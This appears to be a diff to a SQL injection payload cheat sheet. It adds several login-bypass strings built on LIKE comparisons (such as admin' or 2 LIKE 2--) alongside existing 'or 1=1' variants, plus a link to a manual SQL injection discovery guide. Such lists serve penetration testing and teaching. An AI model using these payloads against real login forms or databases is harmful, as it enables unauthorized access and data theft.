@@ -123,6 +123,7 @@ or true--
 " or "x"="x
 ") or ("x")=("x
 ")) or (("x"))=(("x
+or 2 like 2
 or 1=1
 or 1=1--
 or 1=1#
@@ -130,6 +131,14 @@ or 1=1/*
 admin' --
 admin' #
 admin'/*
+admin' or '2' LIKE '1
+admin' or 2 LIKE 2--
+admin' or 2 LIKE 2#
+admin') or 2 LIKE 2#
+admin') or 2 LIKE 2--
+admin') or ('2' LIKE '2
+admin') or ('2' LIKE '2'#
+admin') or ('2' LIKE '2'/*
 admin' or '1'='1
 admin' or '1'='1'--
 admin' or '1'='1'#
@@ -318,3 +327,4 @@ mysql> mysql> select version();
   - [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
   - [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
   - [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
+  - [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
